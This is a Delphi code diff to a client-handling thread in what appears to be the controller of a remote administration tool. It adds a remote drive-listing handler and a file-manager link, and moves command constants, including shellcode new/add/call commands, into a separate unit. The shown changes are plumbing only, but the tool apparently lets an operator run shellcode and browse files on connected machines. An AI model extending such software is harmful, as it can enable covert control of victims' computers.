@@ -8,14 +8,8 @@ uses
   Sysutils,
   CLasses,
   ComCtrls,
-  untUtil;
-
-const
-  CMD_ONLINE = 0;
-  CMD_SHELLCODE_QUESTION = 1;
-  CMD_SHELLCODE_NEW = 2;
-  CMD_SHELLCODE_ADD = 3;
-  CMD_SHELLCODE_CALL = 4;
+  untUtil,
+  untCommands;
 
 type
   TClientThread = class(TObject)
@@ -26,6 +20,7 @@ type
     Data:AnsiString;
     mySocket:TCustomWinsocket;
     lstItem:TListItem;
+    frmControl:TObject;
     constructor Create(CreateSuspended: Boolean);
     procedure Cleanup;
     procedure ReadData;
@@ -33,7 +28,7 @@ type
   end;
 implementation
 
-uses Unit1;
+uses Unit1, untControl, untFilemanager;
 
 procedure TClientThread.ParsePacket(mBuff:Pointer; dwLen:Integer; bCMD:Byte);
 var
@@ -55,11 +50,18 @@ begin
             lstItem.SubItems.Add(lstTokens[0]);
             lstItem.SubItems.Add(lstTokens[1]);
             lstItem.SubItems.Objects[0] := Self;
-            SendBuffer(CMD_ONLINE,PChar('TEST'),10);
           end;
         end else begin
           mysocket.Close;
           exit;
+        end;
+      end;
+    CMD_DRIVE_LIST:
+      begin
+        SetString(tempGUIString, PChar(mBuff), dwLen div 2);
+        if Assigned(Self.frmControl) then
+        begin
+          TForm2(TForm3(Self.frmControl).frmFilemanager).cmbDrives.Items.Add(tempGUIString);
         end;
       end;
   end;
@@ -93,12 +95,17 @@ end;
 
 procedure TClientThread.Cleanup;
 begin
-  lstItem.Delete;
+  if Assigned(lstItem) then
+    lstItem.Delete;
+
+  if Assigned(frmControl) then
+    frmControl.Free;
 end;
 
 constructor TClientThread.Create;
 begin
   mySocket := nil;
+  frmControl := nil;
 end;
 
 procedure TClientThread.ReadData();
@@ -106,7 +113,6 @@ var
   DataSize, dwBuffLen: Cardinal;
   mData:AnsiString;
   bByte:Byte;
-  LengthDataSize,LengthSocketData: integer;
   pSocketHeader:LPSocketHeader;
 begin
   if mySocket = nil then exit;
@@ -120,6 +126,7 @@ begin
   dwBuffLen := Length(Data);
   if DataSize > dwBuffLen then exit;
   mData := Copy(Data,1,DataSize);
+  Delete(Data,1, DataSize);
   //Dec(DataSize);
   ParsePacket(@mData[1], DataSize, bByte);
   if Length(Data) > 0 then begin
